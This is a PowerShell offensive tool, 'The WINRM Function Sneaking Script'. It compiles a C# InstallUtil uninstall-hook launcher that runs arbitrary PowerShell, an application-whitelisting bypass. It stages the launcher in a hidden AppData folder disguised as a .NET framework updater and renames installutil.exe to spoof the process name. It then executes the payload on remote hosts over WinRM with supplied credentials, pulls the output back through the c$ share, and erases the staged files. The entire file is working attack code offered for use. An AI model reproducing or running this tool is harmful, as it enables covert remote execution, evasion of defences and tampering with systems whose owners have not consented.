 write-host "
   ____                            |  /   
 |      |\    |  _____     /\      | /
 |      | \   | |         /  \     |/
 |____  |  \  | |_____   /    \    |\
      | |   \ | |       /______\   | \
 _____| |    \| |_____ /        \  |  \
"
Write-Host "The WINRM Function Sneaking Script" -ForegroundColor White
write-host "
sneak [-filepath] [-options]

options
-remotemachine     name of remote machine to sneak(Used with RunRemote)
-testconnection    tests remote box for connectivity
-functioncommand   command from function to run on local box or remote box
-localhostran      run sneak withing the localhost
-Spoofname         Process you want to spoof as(run with spoof switch)
-Credential        User you want to run the command as
-RunRemote         Runs the commands remotely
-Spoof             Spoofs the process as the chosen Spoofname
-Outfilename       The name of the file you want to output to(not path) used with Out switch if required output
-Out               Outputs results to local host
-ViewSessions      Views all sessions you are connected to
-RemoveSession     Removes a session you are connected to" -ForegroundColor Yellow

$sessions=(Get-PSSession).Id
$count=$sessions.count
Write-Host "You have $count Sessions open" -ForegroundColor Green

function Sneak{
[CmdletBinding(DefaultParameterSetName="Local")]

param(
[parameter(mandatory=$true, position=0,ParameterSetname="Local")]
[parameter(ParameterSetname="Remote")]
[validatenotnull()] [string]$filepath,
[parameter(ParameterSetname="Remote")]
[parameter(ParameterSetname="Test")]
[parameter(ParameterSetname="Remove")]
[validatenotnull()]
[string]$remotemachine,
[parameter(ParameterSetname="Test")]
[switch]$testconnection,
[parameter()]
[validatenotnull()]
[string]$Functioncommand,
[parameter(ParameterSetname="Local")]
[switch]$LocalHostRan,
[parameter(ParameterSetname="Remote")]
[switch]$RunRemote,
[parameter(ParameterSetname="Remote")]
[validatenotnull()] [string]$Credential,
[parameter(ParameterSetname="Local")]
[parameter(ParameterSetname="Remote")]
[validatenotnull()] [string]$Spoofname,
[parameter(ParameterSetname="Remote")]
[parameter(ParameterSetname="Local")]
[switch]$Spoof,
[parameter(ParameterSetname="Remote")]
[string]$Outfilename,
[parameter(ParameterSetname="Remote")]
[switch]$Out,
[parameter(ParameterSetname="Remove")]
[switch]$RemoveSession,
[parameter(ParameterSetname="View")]
[switch]$ViewSessions
)
$realpath="C:\Windows\Microsoft.NET\Framework64\v2.0.50727\"
$pathcheck1=Test-Path "$realpath\csc.exe"
$pathcheck2=Test-Path "$realpath\installutil.exe"
if($ViewSessions){
$sessions=(Get-PSSession).Id
$count=$sessions.count
Get-PSSession
Write-Host "You have $count Sessions open" -ForegroundColor Green
}
if($RemoveSession){
Remove-PSSession -ComputerName $remotemachine
}
if($pathcheck1 -and $pathcheck2){
Write-Host "You have the files necessary to go on" -ForegroundColor Green
}#End If
else{
Write-Host "Sorry you don't have the necessary files to do this operarion" -ForegroundColor Red
break;
}
$hiddenpath="C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32"
$hiddenpath2="C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\"
$normpath="C:\users\$env:username\Desktop"
if($testconnection){
if(Test-Connection -ComputerName $remotemachine -Count 4){
if(Get-Service -Name WinRM -ComputerName $remotemachine){
write-host "Connection good" -ForegroundColor Green}
else{
Write-Host "Cannot connect to host" -ForegroundColor Red
return}
}
                    }#End Testconnection


if($RunRemote){
Import-Module -Name $filepath
$Creds=Get-Credential -Credential $Credential
$Value=(Get-PSSession | Where-Object{$_.ComputerName -match "$remotemachine"} | select state).state
if($Value -match "Opened"){
Write-Host "You already have a session opened with this computer" -ForegroundColor Red
$session=Get-PSSession | where-object{$_.computername -match "$remotemachine"}
}
else{
$session=New-PSSession -ComputerName $remotemachine -Credential $Creds
}
$sessiontest=""
$sessiontest=(Get-PSSession).Id
if($sessiontest -eq "$null"){
Write-Host "You ain't got a session set up" -ForegroundColor Red
break
}#End IF
else{
Write-Host "You have a session open"
} #End Else

#This is where it starts to create the C script and executable for the execution of the function
New-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\" -ItemType directory
$creduser=($Creds).UserName
Invoke-Command -Session $session{New-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\" -ItemType directory;$change=Get-item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32";
$change.Attributes="hidden"}
$filebytes=Get-Content -Path $filepath -Encoding Byte
New-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdaterConfigurationScript.ps1" -ItemType file
[system.io.file]::WriteAllBytes("C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdaterConfigurationScript.ps1",$filebytes)
if($Out){
$Functioncommand+="`|Out-File -Filepath C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\$Outfilename"
Add-Content -Value $Functioncommand -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdaterConfigurationScript.ps1";
}
else{
Add-Content -Value $Functioncommand -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdaterConfigurationScript.ps1";
}

$itempath="$normpath\FrameworkTimeUpdater.cs"
New-Item -Path "$itempath" -ItemType file -Value "using System;
 using System.Configuration.Install;
 using System.Runtime.InteropServices;
 using System.Management.Automation.Runspaces;
 public class Program
 {
 public static void Main()
 {
 }
 }
 [System.ComponentModel.RunInstaller(true)]
 public class Sample : System.Configuration.Install.Installer
 {
 public override void Uninstall(System.Collections.IDictionary savedState)
 {
 Mycode.Exec();
 }
 }
 public class Mycode
 {
 public static void Exec()
 {
 string command = System.IO.File.ReadAllText(@`"C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdaterConfigurationScript.ps1`");
 RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
 Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
 rspace.Open();
 Pipeline pipeline = rspace.CreatePipeline();
 pipeline.Commands.AddScript(command);
 pipeline.Invoke();
 }
 }
 "
cd $realpath
invoke-command -Session $session{ cd $using:realpath}
$command="cmd.exe /C csc.exe/r:C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /unsafe /platform:anycpu /out:`"$normpath\FrameworkTimeUpdater.exe`" `"$itempath`""
Invoke-Expression -Command $command
$file=Get-Content -Path "$normpath\FrameworkTimeUpdater.exe" -Encoding Byte
$file2=Get-Content -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdaterConfigurationScript.ps1" -Encoding Byte
Invoke-Command -Session $session{[System.IO.File]::WriteAllBytes("C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdaterConfigurationScript.ps1",$using:file2)}
Invoke-Command -Session $session{[System.IO.File]::WriteAllBytes("C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdater.exe",$using:file)}
rm $itempath
rm "$normpath\FrameworkTimeUpdater.exe"
rm C:\Users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32 -Recurse -Force

if($Spoof){
$SpoofContent=Get-Content -Path "$realpath\installutil.exe" -Encoding Byte
invoke-command -Session $session{ [System.IO.File]::WriteAllBytes("C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\$using:Spoofname",$using:SpoofContent)}
invoke-command -Session $session{ cd C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\}
$command2="cmd.exe /C $spoofname /logfile=C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\log.txt /LogToConsole=false /U `"C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdater.exe`" "
Invoke-Command -Session $session {Invoke-Expression -Command $using:command2}
New-Item -Path C:\Users\$env:username\Desktop\sneakitems -ItemType directory
$creduser=($Creds).username
Copy-Item -Path \\$Remotemachine\c$\users\$creduser\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\$Outfilename -Destination C:\Users\$env:username\Desktop\sneakitems
write-host "Cleaning up[+]" -ForegroundColor Green
Invoke-Command -Session $session{cd C:\Users}
sleep -s 15
Invoke-Command -Session $session {Remove-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32" -Recurse -Force}
}
else{
$command2="cmd.exe /C InstallUtil.exe/logfile=C:\Users\$env:username\Desktop\log.txt /LogToConsole=false /U `"C:\users\$env:username\desktop\FrameworkTimeUpdater.exe`" "
Invoke-Command -Session $session {Invoke-Expression -Command $using:command2}
New-Item -Path C:\Users\$env:username\Desktop\sneakitems -ItemType directory
$creduser=($Creds).username
Copy-Item -Path \\$Remotemachine\c$\users\$creduser\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\$Outfilename -Destination C:\Users\$env:username\Desktop\sneakitems
write-host "Cleaning up[+]" -ForegroundColor Green
Invoke-Command -Session $session{cd C:\Users}
sleep -s 15
Invoke-Command -Session $session {Remove-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32" -Recurse -Force}
}#EndElse
}#End RunRemote


if($LocalHostRan){
Import-Module -Name $filepath
New-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\" -ItemType directory
$change=Get-item -Path $hiddenpath;
$change.Attributes="hidden"
$itempath="$hiddenpath2\FrameworkTimeUpdater.cs"
New-Item -Path "$hiddenpath2\FrameworkTimeUpdater.cs" -ItemType File -Value "using System;
 using System.Configuration.Install;
 using System.Runtime.InteropServices;
 using System.Management.Automation.Runspaces;
 public class Program
 {
 public static void Main()
 {
 }
 }
 [System.ComponentModel.RunInstaller(true)]
 public class Sample : System.Configuration.Install.Installer
 {
 public override void Uninstall(System.Collections.IDictionary savedState)
 {
 Mycode.Exec();
 }
 }
 public class Mycode
 {
 public static void Exec()
 {
 string command = System.IO.File.ReadAllText(@`"$filepath`");
 RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
 Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
 rspace.Open();
 Pipeline pipeline = rspace.CreatePipeline();
 pipeline.Commands.AddScript(command);
 pipeline.Invoke();
 }
 }
 "

Add-Content -Value $Functioncommand -Path $filepath;

cd $realpath
$command="cmd.exe /C csc.exe/r:C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /unsafe /platform:anycpu /out:`"C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdater.exe`" `"$itempath`""
Invoke-Expression -Command $command

if($Spoof){
$SpoofContent=Get-Content -Path "$realpath\installutil.exe" -Encoding Byte
[System.IO.File]::WriteAllBytes("C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\$Spoofname",$SpoofContent)
cd C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications
$command2="cmd.exe /C $spoofname /logfile=`"C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\log.txt`" /LogToConsole=false /U `"C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32\FrameworkApplications\FrameworkTimeUpdater.exe`" "
Invoke-Expression -Command $command2
$removalstuff=Get-Content -Path $filepath | Out-String
$removalstuff=$removalstuff.Replace("$Functioncommand","")
Clear-Content -Path $filepath
Add-Content -Path $filepath -Value $removalstuff
Write-Host "Cleaning up [+]" -ForegroundColor Green
cd C:\Users
sleep -s 15
Remove-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32" -Recurse -Force
}#End Spoof

else{
cd $realpath
$command2="cmd.exe /C InstallUtil.exe /logfile=`"C:\Users\$env:username\Desktop\log.txt`" /LogToConsole=false /U `"C:\Users\$env:username\Desktop\FrameworkTimeUpdater.exe`" "
Invoke-Expression -Command $command2
$removalstuff=Get-Content -Path $filepath | Out-String
$removalstuff=$removalstuff.Replace("$Functioncommand","")
Clear-Content -Path $filepath
Add-Content -Path $filepath -Value $removalstuff
Write-Host "Cleaning up [+]" -ForegroundColor Green
cd C:\Users
sleep -s 15
Remove-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\Windows.NET.32" -Recurse -Force
} #End else
}#End LocalHostRan
}#End Sneak
